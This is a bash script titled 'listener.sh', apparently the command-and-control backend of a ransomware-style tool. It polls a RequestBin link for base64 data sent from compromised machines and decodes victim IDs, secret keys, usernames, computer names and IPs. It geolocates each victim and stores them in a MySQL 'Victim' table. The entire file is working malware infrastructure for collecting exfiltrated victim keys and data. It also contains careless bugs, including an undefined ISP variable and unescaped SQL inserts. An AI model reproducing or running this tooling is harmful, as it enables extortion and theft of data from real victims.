#!/bin/bash
#coding:utf-8
#title:listener.sh
#author:hacknonym
#launch:./listener.sh <REQUESTBIN_LINK>    e.g. ./listener.sh https://requestbin.io/76q8s3d1?inspect

#terminal text color code
grey='\e[0;37m'
yellow='\e[0;33m'

#MySQL credentials
DATABASE_NAME=$(cat ident.txt | grep -e "DBNAME" | cut -d ' ' -f 2)
MYSQL_USER=$(cat ident.txt | grep -e "USERNAME" | cut -d ' ' -f 2)
MYSQL_PASS=$(cat ident.txt | grep -e "PASSWORD" | cut -d ' ' -f 2)

schtml="arg.txt"

while [ true ] ; do
  echo -e "[+] Download in progress..."
  wget $1 -O $schtml 1> /dev/null 2>&1
  clear && echo -e "[>] $1"
  for i in $(cat $schtml | grep -A3 "QUERYSTRING" | grep -e "keypair" | cut -d '>' -f 3 | cut -d '<' -f 1) ; do
    echo -e "$i" > decode.txt
    content=$(base64 -d decode.txt)

    id=$(echo -e "$content" | cut -d '_' -f 1)

    if mysql --user=$MYSQL_USER --password="$MYSQL_PASS" --database=$DATABASE_NAME --batch -e "SELECT Ident FROM Victim;" | grep -v "Ident" | grep -e "$id" 1> /dev/null 2>&1 ; then
      echo -en "\r"
    else
      key=$(echo -e "$content" | cut -d '_' -f 2)
      day=$(echo -e "$content" | cut -d '_' -f 3)
      date=$(echo -e "$content" | cut -d '_' -f 4)
      daynumber=$(echo -e "$date" | cut -d '/' -f 1)
      month=$(echo -e "$date" | cut -d '/' -f 2)
      year=$(echo -e "$date" | cut -d '/' -f 3)
      time=$(echo -e "$content" | cut -d '_' -f 5)
      username=$(echo -e "$content" | cut -d '_' -f 6)
      computername=$(echo -e "$content" | cut -d '_' -f 7)
      publicip=$(echo -e "$content" | cut -d '_' -f 8)

      if [ ! -z "$publicip" ] ; then
        echo -e "[+] Add Id:$yellow$id$grey inside $DATABASE_NAME database with IP:$yellow$publicip$grey"
        geoinfo=$(curl -s ipinfo.io/$publicip?token=$TOKEN | jq -r '[.country, .region, .city, .timezone, .org] | join("|")')
        country=$(echo -e "$geoinfo" | cut -d '|' -f 1)
        region=$(echo -e "$geoinfo" | cut -d '|' -f 2)
        city=$(echo -e "$geoinfo" | cut -d '|' -f 3)
        timezone=$(echo -e "$geoinfo" | cut -d '|' -f 4)
        isp=$(echo -e "$geoinfo" | cut -d '|' -f 5)
        mysql --user=$MYSQL_USER --password="$MYSQL_PASS" --database=$DATABASE_NAME -e "INSERT INTO Victim (Date_Compromise, IP_Address, ISP, Country, Region, City, Timezone, User_Name, Computer_Name, Ident, Secret_Key) VALUES ('$year-$month-$daynumber $time', '$publicip', '$contentsp', '$country', '$region', '$city', '$timezone', '$username', '$computername', '$id', '$key');"
      else
        echo -e "[+] Add Id:$yellow$id$grey inside $DATABASE_NAME database"
        mysql --user=$MYSQL_USER --password="$MYSQL_PASS" --database=$DATABASE_NAME -e "INSERT INTO Victim (Date_Compromise, User_Name, Computer_Name, Ident, Secret_Key) VALUES ('$year-$month-$daynumber $time', '$username', '$computername', '$id', '$key');"
      fi
    fi
  done
  count=9;
  for i in $(seq 1 10) ; do 
    echo -en "\r[*] Wait $count(s)"
    count=$(($count-1))
    sleep 1
  done
done
